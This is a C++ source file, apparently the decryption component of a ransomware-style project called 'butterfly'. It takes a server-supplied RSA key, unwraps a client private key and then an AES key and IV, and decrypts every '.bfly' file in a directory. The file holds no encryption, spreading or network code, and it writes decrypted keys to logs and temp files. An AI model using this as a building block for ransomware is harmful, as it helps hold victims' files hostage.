
#include <memory>

#include "crypto/decryptor.h"

namespace butterfly
{

namespace hybrid
{

Decryptor::Decryptor(const std::string &aesKeyDbFilepath) : _aesKeyDbFilepath(aesKeyDbFilepath), _aesDecryptor(new aes::AESDecryptor())
{
    LOG_TRACE("Create class Decryptor");
}

Decryptor::~Decryptor()
{

}

void Decryptor::startWithDir(const std::string &path)
{

    std::string aesk = decryptAESKey(_decryptedCPrivateRSA, "AESKey.bin");
    //std::string aesiv = butterfly::readBinFile("AESIV.txt");
    /*
    try
    {
        _aesKeyDatabase = std::unique_ptr<AESKeyDatabase>(new AESKeyDatabase(_aesKeyDbFilepath));
    } catch (SQLDatabaseException &e)
    {
        LOG_ERROR("Error: " << e.what());
    }
    */

    auto files = DirectoryIterator::getAllFiles(path);
    for (auto &file: files)
    {
        LOG_TRACE("FILE: " << file);
        std::string filepath = file.string();
        if (filepath.find(".bfly") != std::string::npos)
        {
            filepath.erase(filepath.length() - butterfly::ENCRYPTED_FILE_ENDING.length());
        }
        decryptFileWithAES(filepath, aesk, "aesiv");
        /*
        auto data = _aesKeyDatabase->getEntry(filepath);

        if (data.size() == 3)
        {
            std::string aesk = hex_to_string(data[1]);
            std::string aesiv  = hex_to_string(data[2]);
            LOG_TRACE("AES: " << aesk << " with length of: " << aesk.length())
            LOG_TRACE("AESIV: " << aesiv << " with length of: " << aesiv.length())
            decryptFileWithAES(data[0], hex_to_string(data[1]), hex_to_string(data[2]));
        }
        */
    }
    butterfly::removeFile("AESKey.bin");
    butterfly::removeFile("AESKey.txt");
    butterfly::removeFile("AESIV.txt");
}

std::string Decryptor::decryptCPrivateRSA(const std::string &keyFromServer)
{

    _rsaDecryptorCPrivateRSA = std::unique_ptr<rsa::RSADecryptor>(new rsa::RSADecryptor(keyFromServer));

    std::string encCPrivateRSA = _rsaDecryptorCPrivateRSA->getBinKeyFileContents(CPRIVATERSA_FILENAME);
    EVP_PKEY *cPrivateRSAPKey = _rsaDecryptorCPrivateRSA->getEvpPkey();

    try
    {
        _rsaDecryptorCPrivateRSA->decrypt(cPrivateRSAPKey, encCPrivateRSA);
        _decryptedCPrivateRSA = _rsaDecryptorCPrivateRSA->getDecryptedKey();

        LOG_TRACE("Decrypted CPrivateRSA: " << _decryptedCPrivateRSA);

    } catch (RSADecryptionException &e)
    {
        LOG_ERROR(e.what());
    }



    return _decryptedCPrivateRSA;
}

std::string Decryptor::decryptAESKeyFile(const std::string &aesKeyFile)
{

    _rsaDecryptorAESKey = std::make_shared<rsa::RSADecryptor>(_decryptedCPrivateRSA);

    std::string encAESKey = _rsaDecryptorAESKey->getBinKeyFileContents(aesKeyFile);
    EVP_PKEY *aesKeyPKey = _rsaDecryptorAESKey->getEvpPkey();

    try
    {
        _rsaDecryptorAESKey->decrypt(aesKeyPKey, encAESKey);
        _decryptedAESKey = _rsaDecryptorAESKey->getDecryptedKey();
        LOG_TRACE("Decrypted AES Key: " << _decryptedAESKey);
        butterfly::writeBinFile("AESKey.txt", _decryptedAESKey.c_str(), static_cast<long>(_decryptedAESKey.length()));
    } catch (RSADecryptionException &e)
    {
        LOG_ERROR(e.what());
    }

    return _decryptedAESKey;
}

std::string Decryptor::decryptAESIVFile(const std::string &aesKeyFile)
{

    _rsaDecryptorAESIV = std::make_shared<rsa::RSADecryptor>(_decryptedCPrivateRSA);

    std::string encAESKey = _rsaDecryptorAESIV->getBinKeyFileContents(aesKeyFile);
    EVP_PKEY *aesKeyPKey = _rsaDecryptorAESIV->getEvpPkey();

    try
    {
        _rsaDecryptorAESIV->decrypt(aesKeyPKey, encAESKey);
        _decryptedAESIV = _rsaDecryptorAESIV->getDecryptedKey();
        LOG_TRACE("Decrypted AES IV: " << _decryptedAESIV);
        butterfly::writeBinFile("AESIV.txt", _decryptedAESIV.c_str(), static_cast<long>(_decryptedAESIV.length()));

    } catch (RSADecryptionException &e)
    {
        LOG_ERROR(e.what());
    }

    return _decryptedAESIV;
}

void Decryptor::decryptFileWithAES(const std::string &filepath, const std::string &, const std::string &)
{
    std::string aeskey = butterfly::readBinFile("AESKey.txt");
    _aesDecryptor->setAESKey(aeskey);
    std::string aesiv = butterfly::readBinFile("AESIV.txt");
    _aesDecryptor->setAESIv(aesiv);

    try
    {
        _aesDecryptor->decryptFile(filepath);

    } catch (AESDecryptionException &e)
    {
        LOG_ERROR(e.what());
    }

}

std::string Decryptor::decryptAESKey(const std::string &decryptedCPrivateRSA, const std::string &aesKeyFile)
{

    _rsaDecryptorAESKey = std::unique_ptr<rsa::RSADecryptor>(new rsa::RSADecryptor(decryptedCPrivateRSA));

    std::string encAESKey = _rsaDecryptorAESKey->getBinKeyFileContents(aesKeyFile);
    EVP_PKEY *aesKeyPKey = _rsaDecryptorAESKey->getEvpPkey();

    try
    {
        _rsaDecryptorAESKey->decrypt(aesKeyPKey, encAESKey);
        _decryptedAESKey = _rsaDecryptorAESKey->getDecryptedKey();
        LOG_TRACE("Decrypted AES Key: " << _decryptedAESKey);

    } catch (RSADecryptionException &e)
    {
        LOG_ERROR(e.what());
    }

    return _decryptedAESKey;
}

} // namespace hybrid

} // namespace butterfly
